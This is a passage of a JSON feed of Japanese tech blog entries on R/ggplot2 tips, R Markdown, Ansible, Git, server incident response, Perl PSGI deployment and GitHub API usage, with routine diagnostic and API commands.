Yasumoto","authorId":"atusy"},{"title":"felp 0.1.3","link":"https://blog.atusy.net/2018/11/18/felp-0-1-3/","contentSnippet":"felp 0.1.3 を 公開 しました．ようやく実用レベルになったかと思います．関数のソースとヘルプを同時に見たい人のためのパッケージです．ソースの読解が捗りますね!インストール方法devtools::install_github(\\"atusy/felp\\")使い方?print や print?. と打つだけ．","isoDate":"2018-11-18T00:00:00.000Z","dateMiliSeconds":1542499200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rmdのfig.capを図を生成するチャンク内にglueで書く","link":"https://blog.atusy.net/2018/11/11/glue-for-fig-cap-in-rmd/","contentSnippet":"Rmdのchunkオプションである fig.cap の評価は，チャンクの評価が終わってからです．この性質を利用すると，チャンク内にキャプションと図を同居させることが簡単になります．","isoDate":"2018-11-11T00:00:00.000Z","dateMiliSeconds":1541894400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplot2のレジェンド位置を調整","link":"https://blog.atusy.net/2018/11/10/ggplot2-legend-pos-n-just/","contentSnippet":"ggplot2のレジェンド位置を変えるにはLet’s try!パッケージ基本となる図を用意レジェンド位置を数値で指定するレジェンド位置を文字列で指定するlegend.positionlegend.justificationEnjoy!ggplot2のレジェンド位置を変えるにはCookbookのChanging the position of the legendが参考になる．要は theme() を使ってlegend.position を長さ2の数値ベクトルないし\\"none\\" , \\"left\\" , \\"right\\" , \\"bottom\\" , \\"top\\" の文字列で与え，","isoDate":"2018-11-10T00:00:00.000Z","dateMiliSeconds":1541808000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"geom_histogramのビン幅を動的に決定する","link":"https://blog.atusy.net/2018/11/09/binwdith-for-geom-histogram/","contentSnippet":"TL; DRggplot2のヒストグラムはビン数30が既定ビン幅を動的に決めたいgeom_histogram(binwidth = ) に関数を指定ビン幅を決める関数を定義テストEnjoy!TL; DRgeom_histogram(binwidth = ) はデータを受け取ってビン幅を返す関数を受け付けるよ。ggplot2のヒストグラムはビン数30が既定なぜ……。調整するには bins でビン数を変えるか、 binwidth でビン幅を変える。両方指定すると binwidth が優先される。","isoDate":"2018-11-09T00:00:00.000Z","dateMiliSeconds":1541721600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"[Docker] awslogs-datetime-format の指定方法に注意","link":"https://qiita.com/toshikish/items/59a3a4426930e29f0673","contentSnippet":"[Docker] awslogs-datetime-format の指定方法に注意背景Dockerの awslogs ログドライバでは，awslogs-datetime-format オプション…","isoDate":"2018-11-07T03:23:50.000Z","dateMiliSeconds":1541561030000,"authorName":"toshikish","authorId":"toshikish"},{"title":"R起動時に不足パッケージを導入しつつ読み込む","link":"https://blog.atusy.net/2018/11/06/defaultpackages-rprofile/","contentSnippet":".Rprofileを使っていつも使うパッケージはR起動時に読み込む例えば， tidyverse を読み込みたいなら，options(defaultPackages = c(getOption(\'defaultPackages\'), \'tidyverse\'))とする．library ではなく options を利用することで，filter() で dplyr::filter() を呼ぶつもりが stats::filter() を呼んでしまうような事故を防げる．不足パッケージをインストールしたいこれは一筋縄ではいかず，私は callr::r() を使うことで解決した．","isoDate":"2018-11-06T00:00:00.000Z","dateMiliSeconds":1541462400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplot2で$TeX$を利用する","link":"https://blog.atusy.net/2018/11/03/tex-in-ggplot2/","contentSnippet":"はじめにインストール使ってみるタイトルなどで \\\\(TeX\\\\)geom_text で \\\\(TeX\\\\)facet_wrap や facet_grid で \\\\(TeX\\\\)Enjoy!はじめにggplot2 で \\\\(TeX\\\\) 記法が使えると嬉しいですよね．一応，そういう人たちのための入口としては expression だとか bquote だとかがあるんですが，ここでは紹介しません．いえ，毎度使い方を忘れてしまい，紹介できないというのが正しいです．","isoDate":"2018-11-03T00:00:00.000Z","dateMiliSeconds":1541203200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"patchworkの表示を高速化したかった……","link":"https://blog.atusy.net/2018/11/03/accelarate-patchwork/","contentSnippet":"失敗の記録．目的ggplotのリストの表示を高速化するで紹介した通り，ggplotオブジェクトはprintされる段になって，プロットに必要な計算を行っているため，大量のggplotを行うならば，計算部分を並列化し，表示を順次行うのが効率的だ．patchworkを使ってggplotオブジェクトを並べる時も同様では……？ と思い，実験したが，何故かそうはならなかった．","isoDate":"2018-11-03T00:00:00.000Z","dateMiliSeconds":1541203200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplot2とpatchworkで周辺分布","link":"https://blog.atusy.net/2018/11/02/marginal-patchwork/","contentSnippet":"patchworkパッケージを使えばあんな図やこんな図が簡単に，と思い馳せた人も多いのではなかろうか．参考: TokyoR 73での発表スライド中でも周辺分布を自由に綺麗に，と思ったのは私だけではないはず．","isoDate":"2018-11-02T00:00:00.000Z","dateMiliSeconds":1541116800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"RmarkdwonのYAMLフロントマターで\\ntitleとか\\nauthorとか\\n改行する","link":"https://blog.atusy.net/2018/10/27/linbreaks-in-yaml-front-matter-of-rmd/","contentSnippet":"@niszet0 さん著「R MarkdownでWord文書を作ろう」を読んでます。Rmdを扱った商業誌にも、同書ほどRmdファイルのYAMLフロントマターの書式を丁寧に書いている本はないのではないだろうか。使えれば良いというスタンスだったのもあって、YAMLのフロースタイルとか、始めて学びました。しかし、これだけ詳しく書いてあるのに改行のことに触れられていないな、とふと。","isoDate":"2018-10-27T00:00:00.000Z","dateMiliSeconds":1540598400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Plotlyで軸比を1:1に固定する","link":"https://blog.atusy.net/2018/10/26/plotly-fixed-axes/","contentSnippet":"今迄Plotly.jsを使いたい時は、元の図を ggplot2 パッケージで作成し、 plotly::ggplotly() で変換していた。しかし、どうもパフォーマンスが悪い気がするので、Plotlyネイティブに書いてみようと思った。","isoDate":"2018-10-26T00:00:00.000Z","dateMiliSeconds":1540512000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdown で PlantUML","link":"https://blog.atusy.net/2018/10/25/plantuml-on-rmd/","contentSnippet":"@niszet0 さんの “R MarkdownでWord文書を作ろう” を摘み食いしてます (以下RmdでWord本)．ちゃんとしたいずれレビューはいずれするとして，気付いたところを少しずつメモしていきたい．","isoDate":"2018-10-25T00:00:00.000Z","dateMiliSeconds":1540425600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"結婚式で使った楽曲","link":"https://blog.atusy.net/2018/10/22/bridal-music/","contentSnippet":"9/29に結婚式を挙げました。なんとこの日は私の愛すDo As Infinityのデビュー日。ゆかりんが登場したことで、一部が騒然(？)としましたが、Do As Infinityメドレーなど、私の趣味全開です。","isoDate":"2018-10-22T00:00:00.000Z","dateMiliSeconds":1540166400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"TokyoR 73 行ってきました","link":"https://blog.atusy.net/2018/10/21/tokyor73/","contentSnippet":"2018年10月20日はJuliaなんちゃらやらなんやらと沢山の勉強会が同時開催された日だったらしいですね。私はTokyoR 73を選んで「ggplot2で図を並べる」と題して facet_grid() 、 facet_wrap() 、 patchwork パッケージについて作例交えて話してきました。","isoDate":"2018-10-21T00:00:00.000Z","dateMiliSeconds":1540080000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplotのリストの表示を高速化する","link":"https://blog.atusy.net/2018/10/16/accelerate-list-of-ggplot/","contentSnippet":"大きなデータを用いたggplotのリストや，大量のggplotのリストを高速に描写するための関数 print_gglist を作りました．devtools::install_github(\'atusy/ggAtusy\')で遊べます．はじめにggplot2パッケージで作成したプロット (ggplotオブジェクト) はprintされる段になって，プロットに必要な計算を行っている．","isoDate":"2018-10-16T00:00:00.000Z","dateMiliSeconds":1539648000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Antergos導入","link":"https://blog.atusy.net/2018/10/11/hello-antergosmd/","contentSnippet":"自宅用PCにAntergosを導入しました．ppaを足すも.debや.tar.gzを落とすもなんかかったるくなってAURが楽しそうなArchlinux系列を試すことにしました．","isoDate":"2018-10-11T00:00:00.000Z","dateMiliSeconds":1539216000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ローカル環境でAnsibleの鍵交換がめんどくさい貴方に送るプラクティス","link":"https://qiita.com/skikkh/items/ca236c512d314691b35c","contentSnippet":"はじめに平成の時分も終わりに近づく中、野分立ち尽くす天災に人々は翻弄され、お家で過ごすのを余儀なくされる日が多いように思います。^1今日のような一日は、自然とQiitaにたどり着き、PVが増…","isoDate":"2018-09-30T09:33:37.000Z","dateMiliSeconds":1538300017000,"authorName":"skikkh","authorId":"skikkh"},{"title":"新人が学ぶAnsibleもくもく会 ネットワーク編 報告会","link":"https://qiita.com/skikkh/items/156c677e07ffc6b5b4ef","contentSnippet":"はじめにお久しぶりのエントリになります。新卒でインフラエンジニアをしている小心者のひよこです。このような職種に身をおいてはや5ヶ月というところで、世の中を幅広く見渡してみると、どうやら世は大…","isoDate":"2018-08-29T14:34:09.000Z","dateMiliSeconds":1535553249000,"authorName":"skikkh","authorId":"skikkh"},{"title":"roxygen2タグまとめ","link":"https://blog.atusy.net/2018/08/28/roxygen2matome/","contentSnippet":"まとめTips@title、@description、@details について@importFrom、@seealso について@examplesをcheckしたくない時if (interactive()) {}でコードを囲む\\\\dontrun{}でコードを囲むその他References変更履歴Roxygen2のタグについての情報が複数箇所に分散していて調べるのが大変なのでまとめた。","isoDate":"2018-08-28T00:00:00.000Z","dateMiliSeconds":1535414400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"欠損値の発生過程の類別","link":"https://blog.atusy.net/2018/08/25/missing-value-type/","contentSnippet":"先日、欠損値の発生過程の例を図示してTweetしたところ、思ったより反響がよかったので、図をブラシュアップの上、記事に残すことにした。俄仕込みなので、間違いがあったらTwitterで指摘して下さい。","isoDate":"2018-08-25T00:00:00.000Z","dateMiliSeconds":1535155200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rmdでchunkごとの実行時間を計測","link":"https://blog.atusy.net/2018/08/18/time-each-chunk/","contentSnippet":"Jupyter Notebookでは、コードブロック冒頭で %%timeit と唱えると、ブロックの評価に要した時間を表示できる。https://jakevdp.github.io/PythonDataScienceHandbook/01.07-timing-and-profiling.htmlこれをRmdでもできないかなー？ と思って knit_hooks() を利用してみた。knit_hooks() の使い方の詳細はこちら。","isoDate":"2018-08-18T00:00:00.000Z","dateMiliSeconds":1534550400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"パラメータ付きRmdを試す","link":"https://blog.atusy.net/2018/08/17/rmd-parameterized/","contentSnippet":"パラメータ付きRmdが便利そうだと思ったのでメモと実験パラメータ付きRmdとはYAMLヘッダーの params で作成される変数のリストを用いたRmdうまく使えばYAMLヘッダーさえ弄ればOKな半自動レポーティングの助けになると思われる。","isoDate":"2018-08-17T00:00:00.000Z","dateMiliSeconds":1534464000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R3.5系ではファイル同期ソフトでパッケージを同期しないように","link":"https://blog.atusy.net/2018/07/31/dont-sync-pkg-r3-5/","contentSnippet":"タイトル通り、R3.5系ではファイル同期ソフトでパッケージを同期しないようにしましょう。同期しておくとある環境にインストールしたパッケージを他の環境でもすぐさま利用できて便利だったのですが……。","isoDate":"2018-07-31T00:00:00.000Z","dateMiliSeconds":1532995200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"xetexでunicode文字","link":"https://blog.atusy.net/2018/07/09/xelatex%E3%81%A7utf8%E6%96%87%E5%AD%97/","contentSnippet":"$\\\\LaTeX{}$ で μ や α など特殊文字を直打ちすると、XeTeXを使っている場合は、\\\\setmainfont{IPAMincho}など、ユニコードに対応したフォントを使うように指定する。","isoDate":"2018-07-09T00:00:00.000Z","dateMiliSeconds":1531094400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"GitHub pages with Rmarkdown","link":"https://blog.atusy.net/2018/07/05/github-pages-with-rmarkdown/","contentSnippet":"遅蒔きながら、Rのblogdownパッケージを使ってblogを始めてみた。“Rとblogdownでかんたんにgithub.io上にブログを使ってみよう！！”を参考にしたのだが、何点かハマったところがあったのでメモ。baseurl = \\"/\\"トップページが404の時はもう一度pushしてみる記事の規定拡張子はoptionで指定option(blogdown.ext = \'.Rmd\')参考URLにある option(blogdown.Rmd = TRUE) は過去のもの?","isoDate":"2018-07-05T00:00:00.000Z","dateMiliSeconds":1530748800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"[Laravel] バリデーションデータに前処理したい","link":"https://qiita.com/toshikish/items/f38b691adbebd7ba7720","contentSnippet":"[Laravel] バリデーションデータに前処理したい当てはまるケースフォーム入力データとデータベース保存データの形式が違う．例えば…全角・半角変換先頭・末尾の空白を取り除くユーザーには0…","isoDate":"2018-06-12T09:27:45.000Z","dateMiliSeconds":1528795665000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Git リポジトリを分割する","link":"https://qiita.com/toshikish/items/3529f75c511a65723798","contentSnippet":"以下のようなディレクトリ構造のリポジトリを分割する方法を場合分けしてまとめます。repo1/ ├─ subdir/ ├─ aaa ├─ bbb ├─ ccc └─ dddケース1：サブディレクト…","isoDate":"2018-04-11T10:14:22.000Z","dateMiliSeconds":1523441662000,"authorName":"toshikish","authorId":"toshikish"},{"title":"障碍対応と私","link":"https://blog.masasuzu.net/entry/2015/12/18/troubleshooting","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 18日目の記事です昨日は@yashims85さんのAndroid drawableは画像を入れておくだけじゃないでした。今日は障碍の話です。普段障碍対応しているときにやってること考えてることをざっくりと時系列を追って書いていきたいと思います。コンテキストとしてはLinuxサーバでwebサービスをやっていると思っていただければと思います。障碍の検知webサービスを運営していれば、何かしらの監視システムからSlackなりIRCなりメールなり電話なりでアラートの通知が来ると思います。対応報告障碍対応をしている旨をメールなり、何かの連絡手段で伝えます。同じく見ている人がいれば調査作業の分担もできます。状況把握どこで障碍?アラートの通知内容にどのサーバで何が起きた的なことが書いてあるはずなので、それを確認します。だいたいの組織に於いてはサーバ管理表的なものがwebなりExcelなり設定ファイルなりにあるはずなので、そこと照らし合わせてどのプロジェクトのどのロールなのかを把握します。直前に何をした? いつもと違うことは何?webアプリケーションであれば直前に入れた変更が原因かもしれません。また、ちょっと前に入れていた変更だが、cronで時限発火したというケースも考えられるかも知れません。イベント開始で急にトラフィックが上がったと言うことも考えられるかも知れません。普段と変わったことは何かということが把握出来れば対処の幅が広がります。影響範囲は?サービス全体なのか、サービスの1機能の障碍なのか、ミドルウェア障碍なのか、影響がどの範囲に及んでいるのかを見ます。ミドルウェア障碍であれば、最近であれば、冗長化されてるのが普通なので、サービスから切り離して、監視から外せば終わりというパターンも多いです。サービス全体が落ちている場合は、ひとまず重要な関係者に状況の1次連絡すぐにした方が良いでしょう。接続出来る?そもそも、該当サーバに接続出来ない場合は、できることはほぼないので、該当サーバをサービスから外した上で、監視対象から外します。(単体のサーバ障碍の場合)# pingは通る?ping ${IP}# sshできる?ssh ${IP}ログの確認該当サーバ上で動いているミドルウェアやアプリケーションサーバのエラーログを主に見ます。だいたいこの辺に重要な情報が出力されている可能性があります。システムのログも確認した方が良いです。主にsyslogやkernelログを見ると良いでしょう。# syslogを見るless /var/log/syslog# kernelログを見るless /var/log/kern.log# kernelログを見る2dmesgサーバ状態の確認負荷の関係で障碍が起きているのであれば、現在のサーバの状態を確認しましょう。以下のようなコマンドが現状把握に役立つでしょう。# loadaverageおよびログイン中のユーザを見るw# 変なプロセス無いか見るps -ef# orps auxwwww# 開いているポートを確認するnetstat -tlnp# ネットワークコネクションを確認するnetstat -taopen# なにかCPU使いまくってないか見るtop# 現在の負荷の経過を見るdstat -tamsl 5# 過去の負荷情報を見る## CPUsar## memorysar -r## lasar -q対処直前のコミットにバグを入れ込んでしまったのであればリバートすれば解決するでしょうし、特定のサーバ落ちたのであれば、サービスから外してあげるだけで良いかも知れません。障碍の内容によって対処方法は様々です。ここで気を付けたいのは二次災害を起こさないことです。可能であれば、コマンドなり対処スクリプトのレビューをしてもらったり、現状認識に間違いがないかを周りの人にしてもらうと良いでしょう。(往々にして一人で障碍対応せざるを得ない場合もありますが。。)事後報告障碍対応が終わったら、記憶が新鮮なうちに下記の内容をまとめてしかるべき場所に投稿します。この辺の報告のフォーマットはだいたいの組織において決まっていることが多いでしょう。障碍内容影響範囲経過対処方法将来の対策面倒くさがらずに事実をなるべく詳細に書いておくと未来の自分や自組織のためになると思います。私の組織でも過去の障碍報告がだいぶ良い感じにデータベースになっており、たまに読み返すと気付きが得られます。また、この障碍報告を元に、同種の障碍をなるべく起こさない仕組み作りをしていくことが肝要だと思います。終わりに自分が障碍対応しているときにやってること、考えてることをざっくり書いてきました。誰にやり方を教わったわけでもないので、そこは違うとかこうした方がいいとかあれば、いただけると幸いです。明日は、@lycoris102さんのGameJam部 活動年間活動報告です。きっと面白い話なのではないでしょうか。","isoDate":"2015-12-18T13:00:00.000Z","dateMiliSeconds":1450443600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#chibapm Chiba.pm#7に参加しました。","link":"https://blog.masasuzu.net/entry/2015/12/12/chiba.pm-7","contentSnippet":"参加しました。雑なスライドですみません。スライド中に出てきてるやつはどれも五反田のお店で出てきます。五反田企業のガイアックスさんとかモバイルファクトリーさんはPerlの会社なので、美味しいごはんを食べたい人は検討してみてはいかがでしょうか。そういえば、Chiba.pmの開催回数がKichijoji.pm、Gotanda.pmに抜かされそうです。。","isoDate":"2015-12-12T09:39:37.000Z","dateMiliSeconds":1449913177000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-12-12-chiba.pm7","link":"https://speakerdeck.com/masasuzu/2015-12-12-chiba-dot-pm7","contentSnippet":"Chiba.pm#7 2015年をふりかえる","isoDate":"2015-12-12T05:00:00.000Z","dateMiliSeconds":1449896400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Plack/PSGIなwebアプリケーションの実行環境","link":"https://blog.masasuzu.net/entry/2015/12/11/plack-psgi-exec-env","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 11日目の記事です※ 投稿内容は私個人の意見であり、所属企業・部門見解ならびに技術戦略を代表するものではありません。昨日は@rymizukiさんのnpmライブラリの運用と管理についてでした。今日はPerlの話です。お仕事やプライベートでPerlのwebアプリケーションを書くことが多く、いろいろ知見が溜まってきてるので、ここで少し紹介しようと思います。今回はPlack/PSGIなwebアプリケーションの実行環境の話です。mod_perlなアプリケーションとはちょっとコンテキストが違います。少しかっちりコンテキストに近いです。個人で軽くwebアプリケーション立てるならもう少しゆるふわでも問題ないはずです。OSUbuntuのLTSを使うことが多いです。Ubuntu前提の内容が後に続きます。PerlSystem Perlは使ってません。OS/ディストリビューションが変わってもなるべくそのまま動くようにしたいためです。perl-buildで独自ビルドしたPerlを使います。インストール場所としては、 /usr/local/perl/perl-5.${VERSION} に置きます。Perlを独自ビルドしたものをDebian package化して実行環境にはインストールします。他の方法としては、ビルド済みのperlをtarで固めて、配布するというのもあります。どちらでも構わないのですが、ローカルネットワークにaptサーバ立てている関係で、Debian packageの方が運用しやすいのです。また、perlのマイナーバージョンアップの際もDebian packageを作り直した上で、 apt-get upgrade (or aptitude safe-upgrade)で完結するので、aptの操作に慣れていて楽というのもあります。モジュール管理今風にcpanfileでモジュール管理してます。モジュールインストールはCartonを使ってます。Cartonの後継でCarmelも開発されてます。個人的にはそろそろ触っておきたいところです。また、cpanfile.snapshotもレポジトリに入れています。一般的なモジュールは特定の(古い)バージョンに依存せずに動くべきですが、依存モジュールのバージョン違いによって現在動いているアプリケーションが壊れるのを防ぐために、バージョン固定します。cpanfile.snapshotがある状態で下記のように carton install してあげると、どの環境でも同じバージョンのモジュールがインストールされます。carton install --deployment --without develop,test今やってないですが、別方法としては、モジュールがインストール済みの状態で、 carton bundle すると vendar/ にモジュールのtarが固められるので、それもレポジトリ管理した上で、下記の様にインストールするという手もあります。インストールの際は vendor/bin/carton  にfatpackされたcartonコマンドが入るのでそれを使います。(アプリ実行環境にcartonを敢えて入れる必要は無い)# 依存モジュールを固めるcarton bundle# インストール# env.shは後述./script/env.sh vendor/bin/carton install --cached --deployment --without develop,testさらに別方法としては、ビルドサーバで依存モジュールをビルドした上で、ディレクトリごと実行環境にrsyncしてあげる方法です。ビルドサーバを運用しているならば、この方法でも良いでしょう。参照Carton考2014carton bundle && carton install --cachedの使いどころ独自モジュールなるべく、独自モジュールは使わない方が良いのですが、個人的な事情などで、CPANに公開出来ないモジュールに関しては、OrePAN2 でDarkpanを作ってそこからローカルに配信するようにしてます。OrePAN2のサーバを簡単に立ち上げられるOrePAN2::Serverがありますが、一時期は使っていましたが、モジュールのアップロード機能は別にいらないなどの理由で今はwebサーバから静的配信してます。環境変数プロジェクトのレポジトリに config/env.rc という名前で、アプリケーションを動かすために必要な環境変数を定義したファイルを作ります。PERL5_VERSION=\\"22\\"export PROJECT_BASE=\\"/path/to/project\\"export PERL_CARTON_MIRROR=\\"http://orepan.local/\\"export PERL5LIB=\\"${PROJECT_BASE}/local/lib/perl5:${PROJECT_BASE}/lib\\"export PATH=\\"${PROJECT_BASE}/local/bin:/usr/local/perl/perl-5.${PERL5_VERSION}/bin:${PATH}\\"export PLACK_PORT=5555また、 script/env.sh という名前で config/env.rc を読み込んだ上で、プログラムを実行するラッパースクリプトを作ります。スクリプトなどは基本的にこれを通して実行します。#!/bin/bash -ue# 諸々環境変数を設定した上でコマンドを実行する君##       env.sh perl hogehoge.pl#source /path/to/project/config/env.rcexec \\"$@\\"開発環境で、いちいちラッパースクリプト通すのが面倒な場合は、config/env.rc のsymlinkをプロジェクトルートに .envrc として張った上で、direnv使って済ましてしまう場合もあります。web サーバ起動スクリプトpsgiファイルを plackup するのではなく、こんな感じのスクリプトをscript/web みたいな名前で 用意してアプリケーションサーバを起動するようにしてます。#!/usr/bin/env perluse strict;use warnings;use lib \\"$ENV{PROJECT_BASE}/lib\\";use Plack::Loader;use SomeApplication::Config;use SomeApplication::Web::Handler;my $config = SomeApplication::Config->load();my $app    = SomeApplication::Web->to_app();Plack::Loader->load(    $config->{psgi}->{server},    %{ $config->{psgi}->{config} },)->run($app);また、このスクリプトをstart_serverを経由して起動することで、(graceful restartによる)ホットデプロイをできるようにしてます。start_server のプロセスにSIGHUPを送ると子プロセスのアプリケーションサーバを再起動してくれるのですが、 plackup コマンドで起動してると start_server に渡した引数をそのまま使ってplackup を再起動するので、 max_workers の数を変えたいときなど、 start_server 自体のプロセスを再起動しなくてはならないので不便です。なので、起動スクリプトを作ってます。そのほかにも理由があるのですが、参照リンクに詳しくあります。サーバ実装としては、StarletやGazelleを使ってます。参照PSGI/Plackアプリケーションの起動方法いろいろと本番環境アレコレ普通に使う Plack/PSGI ServerGraduate from .psgiデーモン管理現在はUpstartでアプリケーションサーバのデーモン管理してます。以下の理由で、個人的には好きでした(過去形)。最新のUbuntuはSystemdに変わってしまったので、将来的にはSystemdに移行することになるでしょう。Ubuntuに標準で入っていてサーバ起動時の自動起動してくれてデーモン異常終了時に自動再起動してくれて設定はわりかしわかりやすい/etc/init/web-some-application.conf みたいな名前でこんな設定ファイルを作りますdescription \'some web application\'author \'masasuzu <hogehoge@masasuzu.net>\'start on runlevel [2345]stop on starting rc RUNLEVEL=[016]setuid webappsetgid webapp# 異常時に再起動するrespawnscript    . /path/to/project/config/env.rc    export PLACK_ENV=\\"production\\"    exec ${PROJECT_BASE}/local/bin/start_server \\\\        --interval 10           \\\\        --port ${PLACK_PORT}    \\\\        -- ${PROJECT_BASE}/script/service/webend script上記のファイルを作ると以下のように操作出来ます。reloadでSIGHUPが送れるので、アプリケーションサーバのstart_server経由のgraceful restartができます。# 起動service web-some-application start# 停止service web-some-application stop# (start_serverのプロセスごと)再起動service web-some-application restart# Plackサーバを再起動service web-some-application reloadアプリケーションサーバ以外も、ジョブのワーカーなども、独自に設定ファイルを作って、Upstart経由で起動したりしてます。Upstart以外の選択肢としては、先に挙げたSystemdの他、以下のものがあるでしょう。好みと要件に合わせて使えば良いと思います。daemontoolsSuvpervisordSystemd参照Server::Starterから学ぶhot deployの仕組みServer::Starter の --interval オプションは大切Upstart を使ってお手軽 daemon 化Upstart Intro, Cookbook and Best PractisesおわりにWAF(Web Application Framework)やログの話など膨らまそうと思えばもっと膨らませられますが、実行環境の話なので、ここまでで抑えておきます。ざっくりと、Plack/PSGIなアプリケーションの実行環境について説明してきました。PerlでWebアプリケーションを作る時に何か参考になれば幸いです。また、もっと良い方法があれば、教えていただけるとありがたいです。明日は、@nekobato さんです webpackのなにか面白い話があるんじゃないかとわくどきしてます。","isoDate":"2015-12-11T04:30:00.000Z","dateMiliSeconds":1449808200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Github APIを使おう","link":"https://blog.masasuzu.net/entry/2015/12/04/use_github_api","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 4日目の記事です今日は、Github APIの話です。Githubの管理作業は他のWebサービスと同じく基本Webコンソールでできます。ただ、Organizationとかを管理してる場合、ある程度以上規模が大きくなると、定型的な管理作業が増えて、Webでぽちぽちやるには煩雑でつらくなってきます。ここで怠惰エンジニア*1はどうにかこの定型作業を自動化/スクリプト化できないかなと考え始めます。幸い、GithubにはAPIがあるので、これを利用して要件に合わせて、実装することができます。ドキュメントは以下の場所にあるので、各APIの使い方などはそちらを参照してください。GitHub API v3 | GitHub Developer Guideapiアクセスを投げるpublicな情報を取得するには普通にcurlでGET発行するだけで、取得出来ます。curl https://api.github.com/users/masasuzu/reposが、これだけでは、privateな情報にアクセスできません。ので、Basic認証をしてアクセスをします。curl -u ${USER}:${PASSWORD} https://api.github.com/orgs/some_privete/reposただ、この場合、このアカウントで出来ることが全て実行出来てしまうので、下記のリンクからアクセストークンを発行して、権限を絞ってAPIにアクセスするのが望ましいです。アクセストークンは作成時にしか見れないので、ちゃんと書き留めておくようにしましょう。Personal access tokensアクセストークンを使用した場合、下記の3つの方法で認証出来ます。curl -u :${ACCESS_TOKEN} https://api.github.com/orgs/some_privete/reposcurl -H \'Authorization: token ${ACCESS_TOKEN}\' https://api.github.com/orgs/some_privete/reposcurl \'https://api.github.com/orgs/some_private/repos?access_token=${ACCESS_TOKEN}\'ドキュメントに各API発行に必要なscope(権限)が書いてあるので必要なscopeだけ付与してあげると良いです。perlでの選択肢今までで、APIアクセスする手段を得ることはできましたが、シェルスクリプトで処理を組み立てるのは、無謀なので、使い慣れてるプログラミング言語で実装したいところです。当社ではPerlを使い慣れてるエンジニアが多いので、ここではPerlのクライアントを紹介します。現在のところ以下の2つの選択肢があります。PithubNet::Github私はPithubを使っています。使い始めた時期においてPithubの方が更新されてそうだったからです。が、今見るとNet::Githubも更新されてるように見えます。他の言語での選択肢特にプログラミング言語にこだわりが無いのであれば、githubがメンテナンスしてるoctokitを使うと良いと思います。RubyとObjective C、.Netに対応してます。たぶん鉄板だと思います。(しかし、octokitのこのサンライズというかバンダイに怒られそうなデザインは大丈夫なのでしょうか?まとめ煩雑で定型的な作業はGithub APIで自動化すると良いPrivateな情報の操作はアクセストークンを発行してAPIを発行するPerlにはPithubとNet::Githubのクライアントライブラリがあるこだわりがなければ、クライアントはoctokit使うと良い明日は、 @mihyaeru21 さんです。iOS回りの面白いエントリが見れそうです。*1:プログラマの3大美徳の1つ","isoDate":"2015-12-04T14:47:44.000Z","dateMiliSeconds":1449240464000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #6 でLTしてきました。","link":"https://blog.masasuzu.net/entry/2015/09/17/Gotanda.pm6","contentSnippet":"gotanda-pm.connpass.comGotanda.pmでLTしてきました。今回のテーマは障碍でした。半分ネタのトークです。JSTQB Foundation Level のシラバスに載っているソフトウェアテストの7原則をもじったやつです。JSTQB認定テスト技術者資格-シラバス（学習事項）・用語集-言ってみれば、サービスに対して継続的にテストするのが監視なのでテストに対する原則が監視に対しても言えるんじゃないかなーという軽い思いつきから生まれました。無理矢理な部分もありましたが、わりかし当てはまってる部分もあったのではないかと思いました。トーク中美味しいにおいがしてきてつらかったです。(このエントリは懇親会の前に書かれてます)#gotandapm 美味しそうなにおいがして辛い。。。。— masasuzu? (@masasuz) September 17, 2015ガイアックスさん会場提供ありがとうございました。","isoDate":"2015-09-17T12:14:35.000Z","dateMiliSeconds":1442492075000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-09-17_gotanda.pm6","link":"https://speakerdeck.com/masasuzu/2015-09-17-gotanda-dot-pm6","contentSnippet":"Gotanda.pm#6 LT\\r監視の7原則という半分ネタなトーク","isoDate":"2015-09-17T04:00:00.000Z","dateMiliSeconds":1442462400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#yapcasia YAPC::Asia 2015でボランティアスタッフしてきた","link":"https://blog.masasuzu.net/entry/2015/08/23/YAPC_Asia","contentSnippet":"今年のYAPC::Asiaは終わった。つつがなく終わりました。過去のエントリを見直すと2011、2012年は書くのサボっていたみたいでした。私のYAPC::Asia初参加は2010年で6回目の参加でした。#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前に僕らの道があるmasasuzu.hatenablog.jp#yapcasia YAPC::Asia Tokyo 2013に参加してきました。 - 目の前に僕らの道があるmasasuzu.hatenablog.jpYAPC::Asia 2010へ行ってきたよ。 - 